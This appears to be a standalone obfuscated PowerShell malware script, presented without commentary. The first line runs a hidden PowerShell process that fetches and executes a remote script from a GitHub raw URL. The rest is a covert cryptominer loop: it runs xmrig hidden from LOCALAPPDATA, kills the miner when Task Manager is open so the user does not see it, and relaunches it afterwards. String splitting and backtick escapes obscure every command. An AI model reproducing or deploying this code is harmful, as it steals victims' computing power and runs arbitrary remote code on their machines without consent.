&('S'+'tar'+'t-Process') -FilePath ("po"+"wers"+"hell") -WindowStyle ('H'+'idden') -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
﻿${pA`TH} = "$env:LOCALAPPDATA\CTF\xmrig.exe"
${ATIvopRo`cE`Ss} = ${f`A`LSe}
${aTi`VO`TaSK} = ${n`ULl}

while (${T`Rue}){
    &('St'+'art-Sl'+'eep') -Seconds 1
    try {
        .('Ge'+'t-P'+'roce'+'ss') ('task'+'mgr') -ErrorAction ('St'+'op')
        ${a`T`IVotask} = ${tr`Ue}
        try{&('Stop'+'-Pro'+'c'+'ess') -name ('xm'+'rig') -ErrorAction ('S'+'top')}
        catch{}
        ${A`TiVop`ROCess} = ${FA`lSe} 
    }
    catch {
       ${A`TiVoTA`Sk} = ${fa`lse} 
       try{
            .('Get-'+'Proce'+'ss') ('xm'+'rig') -ErrorAction ('S'+'top')
            ${atiVOpr`o`CESs} = ${t`RUE}
       }
       catch{
            if(${a`TIVOp`ROCesS} -eq ${f`Al`Se}){
                &('S'+'tar'+'t-Process') -FilePath ${p`AtH} -WindowStyle ('H'+'idden')
                ${a`TIV`OPROcEsS} = ${t`RuE}
            }
            else{
                ${atI`Vop`Roc`ESs} = ${f`AlSe}
                &('St'+'a'+'rt-'+'Sleep') -Seconds 3
            }
       }
    }
}

